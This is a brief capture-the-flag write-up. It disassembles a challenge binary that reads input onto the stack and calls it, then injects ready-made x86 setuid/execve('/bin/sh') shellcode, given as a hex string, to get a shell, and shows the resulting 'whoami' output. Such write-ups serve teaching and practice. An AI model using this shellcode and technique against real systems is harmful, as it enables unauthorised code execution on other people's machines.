### S0lv3d by H4yicl3


try to download binary

i use gdb-peda to see the asm code
```asm
gdb-peda$ pdis main
Dump of assembler code for function main:
   0x080484f6 <+0>:     push   ebp
   0x080484f7 <+1>:     mov    ebp,esp
   0x080484f9 <+3>:     and    esp,0xfffffff0
   0x080484fc <+6>:     sub    esp,0xa0
   0x08048502 <+12>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048505 <+15>:    mov    DWORD PTR [esp+0xc],eax
   0x08048509 <+19>:    mov    eax,gs:0x14
   0x0804850f <+25>:    mov    DWORD PTR [esp+0x9c],eax
   0x08048516 <+32>:    xor    eax,eax
   0x08048518 <+34>:    call   0x80484cd <be_nice_to_people>
   0x0804851d <+39>:    mov    DWORD PTR [esp+0x8],0x80
   0x08048525 <+47>:    lea    eax,[esp+0x1c]
   0x08048529 <+51>:    mov    DWORD PTR [esp+0x4],eax
   0x0804852d <+55>:    mov    DWORD PTR [esp],0x0
   0x08048534 <+62>:    call   0x8048370 <read@plt>
   0x08048539 <+67>:    lea    eax,[esp+0x1c]			<---- the address of stack store in eax
   0x0804853d <+71>:    call   eax				<---- and eax is called
   0x0804853f <+73>:    mov    edx,DWORD PTR [esp+0x9c]
   0x08048546 <+80>:    xor    edx,DWORD PTR gs:0x14
   0x0804854d <+87>:    je     0x8048554 <main+94>
   0x0804854f <+89>:    call   0x8048380 <__stack_chk_fail@plt>
   0x08048554 <+94>:    leave  
   0x08048555 <+95>:    ret 
```

so we just input shellcode in buffer http://shell-storm.org/shellcode/files/shellcode-549.php
then it will run a shell for us
```python
padding ="\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

print padding
```

try to run it
```
(python excute.py;cat) |./execute 
whoami
hayicle
```
